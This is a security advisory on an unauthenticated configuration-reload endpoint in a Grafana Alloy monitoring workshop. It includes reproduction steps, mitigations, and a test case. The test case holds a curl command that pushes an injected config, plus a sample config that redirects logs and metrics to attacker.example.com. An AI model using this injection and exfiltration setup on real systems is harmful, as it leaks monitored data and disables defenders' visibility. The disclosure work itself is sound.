- Vulnerability Name: Unauthenticated Alloy Configuration Reload Endpoint
- Description:
  - The Grafana Alloy UI exposes a `/-/reload` API endpoint that allows users to reload the Alloy configuration.
  - This endpoint is intended for dynamically updating the monitoring configuration without restarting the Alloy process.
  - However, in the default configuration provided in this workshop, this endpoint is unauthenticated.
  - An attacker who can reach the Alloy UI port (default: 12345) can send a POST request to the `/-/reload` endpoint with a modified Alloy configuration.
  - This modified configuration can inject malicious monitoring pipelines, alter existing ones, or disable monitoring entirely.
  - Steps to trigger the vulnerability:
    1. Deploy the monitoring stack using `docker-compose up -d`.
    2. Ensure that the Alloy UI port (12345) is accessible to the attacker (e.g., by port forwarding or if deployed on a public server).
    3. Craft a malicious Alloy configuration file. This file could contain configurations to:
        - Exfiltrate collected monitoring data to an attacker-controlled server.
        - Modify or disable existing monitoring pipelines, leading to gaps in monitoring or incorrect data.
        - Potentially leverage Alloy's capabilities to interact with the underlying system if such capabilities are exposed through Alloy components (though less likely in a typical monitoring setup).
    4. Send a POST request to `http://<alloy-host>:12345/-/reload` with the crafted malicious configuration in the request body. For example, using `curl`:
        ```bash
        curl -X POST -H "Content-Type: application/alloy" --data-binary @malicious_config.alloy http://localhost:12345/-/reload
        ```
        where `malicious_config.alloy` contains the attacker's crafted configuration.
    5. The Alloy instance will reload its configuration with the provided malicious configuration without any authentication or authorization checks.
- Impact:
  - **High**: An attacker can gain full control over the monitoring configuration of Grafana Alloy.
  - This can lead to:
    - **Data Exfiltration**: Sensitive data collected by Alloy (metrics, logs) can be redirected to an attacker-controlled server.
    - **Monitoring Disruption**: Critical monitoring pipelines can be disabled or altered, leading to undetected security breaches or operational issues.
    - **Potential System Compromise**: While less direct, a highly sophisticated attacker might be able to leverage Alloy's components or configuration capabilities (if any exist for system interaction) to gain further access or control over the monitored environment.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
  - None. The provided `docker-compose.yml` and `config.alloy` do not implement any authentication or network restrictions for the Alloy UI or the `/-/reload` endpoint.
- Missing Mitigations:
  - **Authentication and Authorization**: Implement authentication and authorization for the `/-/reload` endpoint to ensure only authorized users can reload the Alloy configuration. Alloy should provide options to configure authentication mechanisms (e.g., basic auth, API keys, OAuth 2.0).
  - **Network Restrictions**: Restrict network access to the Alloy UI port (12345) to only trusted networks or administrators. This can be achieved using firewalls or network policies to limit access from the public internet or untrusted networks.
  - **Input Validation and Sanitization**: While primarily an authentication issue, input validation on the reloaded configuration could provide a defense-in-depth measure to prevent the injection of completely invalid or obviously malicious configurations, although this is not a primary mitigation for unauthorized access.
- Preconditions:
  - The Alloy UI port (12345) is exposed and accessible to the attacker, either directly or through network traversal.
  - The attacker needs to be able to craft a valid (or at least parsable by Alloy) Alloy configuration file to inject.
- Source Code Analysis:
  - The provided project files do not contain the source code of Grafana Alloy itself.
  - Based on the documentation and observed behavior, the vulnerability stems from the default configuration of Alloy and the lack of built-in authentication for the `/-/reload` endpoint.
  - The `docker-compose.yml` file explicitly exposes port `12345` for the `alloy` service:
    ```yaml
    alloy:
     ports:
       - 12345:12345
    ```
  - The `README.md` explicitly documents the `/-/reload` endpoint and how to use `curl` to reload the configuration without mentioning any authentication:
    ```bash
    curl -X POST http://localhost:12345/-/reload
    ```
  - This indicates that by default, the `/-/reload` endpoint is indeed unauthenticated, making it vulnerable to configuration injection if the port is exposed.
- Security Test Case:
  1. **Setup:**
     - Clone the repository: `git clone https://github.com/grafana/docker-monitor-workshop.git`
     - Navigate to the code directory: `cd docker-monitor-workshop/code`
     - Start the monitoring stack: `docker-compose up -d`
  2. **Verification of Alloy UI Access:**
     - Open a web browser and navigate to `http://localhost:12345`. Verify that the Grafana Alloy UI is accessible.
  3. **Craft Malicious Configuration (malicious_config.alloy):**
     - Create a file named `malicious_config.alloy` with the following content (example that attempts to send data to a fake external server - replace `attacker.example.com` with a real attacker server for a real test):
       ```alloy
       local.file_match "demo_logs" {
         path_match = "/tmp/app-logs/*.log"
         forward_to   = [loki.write."default"]
       }

       loki.source.file "logs" {
         format = "raw"
         path_targets = local.file_match.demo_logs.targets
         forward_to = [loki.write."default"]
       }

       loki.write "default" {
         endpoint {
           url = "http://attacker.example.com:3100/loki/api/v1/push" # Attacker controlled Loki instance
         }
         external_labels = {
           job = "injected-config"
         }
       }

       prometheus.exporter.cadvisor "cadvisor" {
         forward_to = [prometheus.remote_write.demo.receiver]
       }

       prometheus.remote_write "demo" {
         endpoint {
           url = "http://attacker.example.com:9090/api/v1/write" # Attacker controlled Prometheus instance
         }
       }

       prometheus.scrape "node" {
         targets = [{
           "__address__" = "localhost:9100" # Example target, may not be relevant in this context
         }]
         forward_to = [prometheus.remote_write.demo.receiver]
       }

       otelcol.exporter.otlphttp "otlp_exporter" {
         client {
           endpoint = "attacker.example.com:4318" # Attacker controlled OTLP endpoint
         }
       }
       ```
  4. **Exploit - Reload Configuration with Malicious Config:**
     - Open a terminal and execute the following `curl` command:
       ```bash
       curl -X POST -H "Content-Type: application/alloy" --data-binary @malicious_config.alloy http://localhost:12345/-/reload
       ```
  5. **Verification of Successful Reload (Optional):**
     - Check the Alloy container logs (`docker logs alloy`) for any errors during reload. Successful reload might not produce explicit success messages in logs, but errors would indicate a failed reload.
  6. **Verify Impact (Data Exfiltration - requires attacker-controlled servers):**
     - On the attacker-controlled server (`attacker.example.com`), check if it receives data on ports 3100 (Loki), 9090 (Prometheus remote write), and 4318 (OTLP).
     - If data is received, it confirms successful configuration injection and potential data exfiltration.
  7. **Cleanup:**
     - Stop the monitoring stack: `docker-compose down`

This security test case demonstrates how an attacker can reload the Alloy configuration without authentication and potentially inject malicious configurations. The success of data exfiltration depends on the attacker setting up listening services on `attacker.example.com` and the network connectivity between the workshop environment and the attacker's server.